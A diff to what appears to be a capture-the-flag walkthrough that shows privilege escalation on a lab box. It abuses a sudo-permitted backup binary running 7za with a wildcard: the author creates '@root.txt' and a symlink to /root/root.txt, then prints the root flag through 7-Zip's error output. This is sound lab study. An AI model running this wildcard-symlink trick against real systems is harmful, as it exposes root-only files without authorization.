@@ -177,6 +177,72 @@ set httpd port 2812
 
 that is the password for xander
 
-trying with ssh and getting the xander shell
+trying with ssh and getting the shell as xander
+
+sudo -l:
+Matching Defaults entries for xander on usage:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User xander may run the following commands on usage:
+    (ALL : ALL) NOPASSWD: /usr/bin/usage_management
+
+strings /usr/bin/usage_management
+
+/var/www/html
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+Error changing working directory to /var/www/html
+/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql
+Password has been reset.
+
+this could be wildcard spare trick
+
+so we need to create a symlink for root.txt in the directory and then launch the backup archieve
+
+so we move to cd /var/www/html
+
+touch @root.txt
+
+ln -s /root/root.txt root.txt
+
+sudo /usr/bin/usage_management
+
+ande we get the flag:
+
+Choose an option:
+1. Project Backup
+2. Backup MySQL data
+3. Reset admin password
+Enter your choice (1/2/3): 1
+
+7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21
+p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7302P 16-Core Processor                (830F10),ASM,AES-NI)
+
+Open archive: /var/backups/project.zip
+--       
+Path = /var/backups/project.zip
+Type = zip
+Physical Size = 54955347
+
+Scanning the drive:
+          
+WARNING: No more files
+f70e78b40f6495e5924584361addc9dd
+
+2984 folders, 17998 files, 124174833 bytes (119 MiB)           
+
+Updating archive: /var/backups/project.zip
+
+Items to compress: 20982
+
+                                                                               
+Files read from disk: 17998
+Archive size: 55292251 bytes (53 MiB)
+
+Scan WARNINGS for files and folders:
+
+f70e78b40f6495e5924584361addc9dd : No more files
+----------------
+Scan WARNINGS: 1
 
 
